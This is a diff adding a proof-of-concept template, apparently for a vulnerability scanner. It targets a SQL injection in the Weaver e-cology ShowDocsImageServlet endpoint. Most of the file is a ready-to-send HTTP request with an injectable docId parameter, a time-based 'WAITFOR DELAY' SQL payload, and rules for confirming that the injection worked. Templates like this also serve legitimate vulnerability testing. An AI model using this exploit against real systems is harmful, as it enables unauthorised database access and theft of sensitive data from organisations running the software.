@@ -1,0 +1,16 @@
+﻿<DudePoc_Name>泛微 e-cology weaver.docs.docs.ShowDocsImageServlet 存在SQL注入漏洞</DudePoc_Name>
+<DudePoc_Description>上海泛微网络科技股份有限公司e-cology weaver.docs.docs.ShowDocsImageServlet 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。</DudePoc_Description>
+<DudePoc_SetHeader>
+GET /weaver/weaver.docs.docs.ShowDocsImageServlet?docId=1$<AttackCode>$ HTTP/1.1
+Host: $<AttackHost>$
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>^(?=.*?image)(?=.*?Content-Type).*?$</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode>+WAITFOR+DELAY+'0%3a0%3a1'</DudePoc_AttackCode>
